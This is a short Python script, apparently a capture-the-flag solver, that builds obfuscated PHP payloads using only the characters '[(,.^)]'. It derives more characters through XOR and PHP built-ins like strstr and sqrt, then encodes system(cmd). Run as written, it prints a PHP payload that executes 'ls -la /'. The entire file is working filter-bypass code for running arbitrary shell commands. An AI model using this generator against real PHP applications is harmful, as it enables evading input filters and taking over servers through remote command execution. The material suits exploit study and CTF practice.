#!/usr/bin/env python3

import sys
from itertools import combinations


# Using ("str"^"str") notation, we can use xor to create
# some new characters out of the characters we already have.
# Repeat several times, as nessecary.
def expand():
    loop = True
    while loop:
        loop = False
        for com in combinations(list(cs), 2):
            new = chr(ord(com[0]) ^ ord(com[1]))
            if new.isprintable():
                if not new in cs:
                    cs[new] = cs[com[0]] + "^" + cs[com[1]]
                    loop = True


# Given an input string, will try to return the encoded form of that string.
def stringfor(s):
    return ".".join(f"({cs[c]})" for c in s)


# Generate all the characters we can.
def build_cs():
    # We get 7 characters for free
    for c in "[(,.^)]":
        cs[c] = f"'{c}'"

    # 'strstr' === '())())'^'[][[]['
    p_strstr = "'())())'^'[][[]['"

    # 'sqrt' === '(,))'^'[][]'
    p_sqrt = "'(,))'^'[][]'"

    # False === ('strstr')('.',',')
    p_false = f"({p_strstr})('.',',')"

    # 'k' === ((false^false).'.')^'['
    cs["k"] = f"(({p_false}^{p_false}).'.')^'['"
    expand()

    # '9' === (('sqrt')('5').'.')['12']
    cs["9"] = f"(({p_sqrt})({stringfor('5')}).'.')[{stringfor('12')}]"
    expand()


# Given cmd, generate a payload that executes system(cmd)
def system(cmd):
    return f"({stringfor('system')})({stringfor(cmd)})"


cs = dict()
build_cs()

if __name__ == "__main__":
    print("<?php")
    print(system("ls -la /"))
    print("?>")
